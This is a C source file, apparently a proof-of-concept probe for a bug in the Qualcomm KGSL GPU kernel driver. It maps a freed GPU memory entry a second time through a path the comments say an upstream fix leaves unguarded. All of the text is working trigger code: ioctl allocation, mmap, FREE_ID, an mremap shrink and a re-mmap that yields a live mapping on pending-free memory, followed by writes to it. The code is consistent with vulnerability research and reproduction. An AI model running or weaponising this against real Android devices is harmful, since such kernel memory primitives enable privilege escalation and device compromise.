/* kgsl-pend2.c — pending_free resurrection via the find(gpuaddr) path.
 *
 * The upstream fix 0a4ef64e3f only guards kgsl_sharedmem_find() (by gpuaddr).
 * This probe reproduces exactly that path:
 *
 *   alloc E (2 pages) -> mmap by *gpuaddr* offset -> FREE_ID (pending_free=1)
 *   -> mremap shrink => tail vm_close sets memdesc.useraddr = 0 while the head
 *      vma still holds E
 *   -> mmap by gpuaddr again: get_mmap_entry find_id(pgoff) misses, then
 *      find(pgoff<<12) returns the pending-free E  [pre-fix: SUCCESS]
 *   -> second live vma on a pending-free entry (resurrection).
 *
 * Also repeats with mmap-by-id (find_id path). Everything read-only.
 * Build: zig cc -target arm-linux-musleabihf -static -O2 -w -Wl,--strip-all
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
struct kgsl_gpumem_alloc_id { unsigned int id, flags; size_t size, mmapsize; unsigned long gpuaddr; unsigned long __pad[2]; };
struct kgsl_gpumem_free_id  { unsigned int id, __pad; };
struct kgsl_gpumem_get_info { unsigned long gpuaddr; unsigned int id, flags; size_t size, mmapsize; unsigned long useraddr; unsigned long __pad[4]; };
#define IOCTL_PMEM_ALLOC_ID _IOWR(KGSL_IOC_TYPE,0x34,struct kgsl_gpumem_alloc_id)
#define IOCTL_PMEM_FREE_ID  _IOWR(KGSL_IOC_TYPE,0x35,struct kgsl_gpumem_free_id)
#define IOCTL_PMEM_GET_INFO _IOWR(KGSL_IOC_TYPE,0x36,struct kgsl_gpumem_get_info)
#define DEV "/dev/kgsl-3d0"

static int g_fd=-1;
static void on_alarm(int s){ (void)s; write(1,"[!] alarm\n",10); _exit(0x42); }

static int alloc_one(size_t sz, unsigned *id, unsigned long *gpu){
    struct kgsl_gpumem_alloc_id a; memset(&a,0,sizeof a); a.size=sz; a.flags=0;
    if(ioctl(g_fd,IOCTL_PMEM_ALLOC_ID,&a)<0) return -1;
    *id=a.id; *gpu=a.gpuaddr; return 0;
}
static long get_info(unsigned id, struct kgsl_gpumem_get_info *o){
    struct kgsl_gpumem_get_info gi; memset(&gi,0,sizeof gi); gi.id=id;
    errno=0; long r=ioctl(g_fd,IOCTL_PMEM_GET_INFO,&gi); if(o)*o=gi; return r;
}
static long free_id(unsigned id){
    struct kgsl_gpumem_free_id f; memset(&f,0,sizeof f); f.id=id;
    errno=0; return ioctl(g_fd,IOCTL_PMEM_FREE_ID,&f);
}
static void show(const char *t, long r, struct kgsl_gpumem_get_info *gi){
    if(r<0) printf("    %s: rc=-1 errno=%d (%s)\n",t,errno,strerror(errno));
    else printf("    %s: rc=0 id=%u size=%zu mapsize=%zu gpu=0x%lx useraddr=0x%lx\n",
                t,gi->id,gi->size,gi->mmapsize,gi->gpuaddr,gi->useraddr);
}

/* One resurrection attempt; `by_gpuaddr` selects the lookup path. */
static void trial(const char *tag, int by_gpuaddr){
    printf("[%s] resurrection via %s\n",tag, by_gpuaddr?"find(gpuaddr)":"find_id(id)");
    unsigned id; unsigned long G;
    if(alloc_one(0x2000,&id,&G)){ printf("[-] alloc: %s\n",strerror(errno)); return; }
    printf("    E id=%u gpu=0x%lx size=0x2000\n",id,G);

    /* first mapping: use the path under test so useraddr gets set */
    off_t off = by_gpuaddr ? (off_t)G : ((off_t)id<<12);
    void *vmaA=mmap(NULL,0x2000,PROT_READ|PROT_WRITE,MAP_SHARED,g_fd,off);
    if(vmaA==MAP_FAILED){ printf("[-] mmap vmaA(%s): %s\n",by_gpuaddr?"gpu":"id",strerror(errno)); return; }
    memset(vmaA,0x5a,0x1000); memset((char*)vmaA+0x1000,0x5b,0x1000);
    printf("    vmaA=%p\n",vmaA);

    long fr=free_id(id); printf("    FREE_ID rc=%ld errno=%d (pending_free=1)\n",fr,errno);
    { struct kgsl_gpumem_get_info gi; show("GET_INFO post-free",get_info(id,&gi),&gi); }

    /* shrink 2p -> 1p: tail vm_close sets useraddr=0, head keeps E */
    void *m=mremap(vmaA,0x2000,0x1000,0);
    if(m==MAP_FAILED){ printf("[-] mremap shrink: %s\n",strerror(errno)); return; }
    vmaA=m;
    printf("    mremap shrink -> head=%p (useraddr should be 0)\n",vmaA);
    { struct kgsl_gpumem_get_info gi; show("GET_INFO after shrink",get_info(id,&gi),&gi); }

    /* second mapping while pending_free=1 and useraddr==0.
     * len must equal footprint/size (0x2000), else get_mmap_entry -ERANGE. */
    off = by_gpuaddr ? (off_t)G : ((off_t)id<<12);
    void *vmaB=mmap(NULL,0x2000,PROT_READ|PROT_WRITE,MAP_SHARED,g_fd,off);
    if(vmaB==MAP_FAILED) printf("    re-mmap(%s) -> %s  (NO resurrection)\n",by_gpuaddr?"gpu":"id",strerror(errno));
    else {
        printf("    re-mmap(%s) -> SUCCESS vmaB=%p  <== RESURRECTED on pending-free E\n",by_gpuaddr?"gpu":"id",vmaB);
        memset(vmaB,0x5c,0x2000);
        { struct kgsl_gpumem_get_info gi; show("GET_INFO after re-mmap",get_info(id,&gi),&gi); }
        printf("    readback vmaA[0]=0x%02x vmaB[0]=0x%02x\n",
               ((unsigned char*)vmaA)[0],((unsigned char*)vmaB)[0]);
        if(munmap(vmaB,0x2000)) printf("[-] munmap vmaB: %s\n",strerror(errno));
    }
    if(vmaA && munmap(vmaA,0x1000)) printf("[-] munmap head: %s\n",strerror(errno));
    { struct kgsl_gpumem_get_info gi; show("GET_INFO after unmaps",get_info(id,&gi),&gi); }
}

int main(void){
    setvbuf(stdout,NULL,_IONBF,0);
    signal(SIGALRM,on_alarm); alarm(50);
    printf("== kgsl pending_free resurrection probe (uid=%d) ==\n",(int)getuid());
    g_fd=open(DEV,O_RDWR);
    if(g_fd<0){ printf("[-] open %s: %s\n",DEV,strerror(errno)); return 1; }
    trial("O2-gpu",1);
    trial("O2-id",0);
    printf("== done ==\n");
    return 0;
}
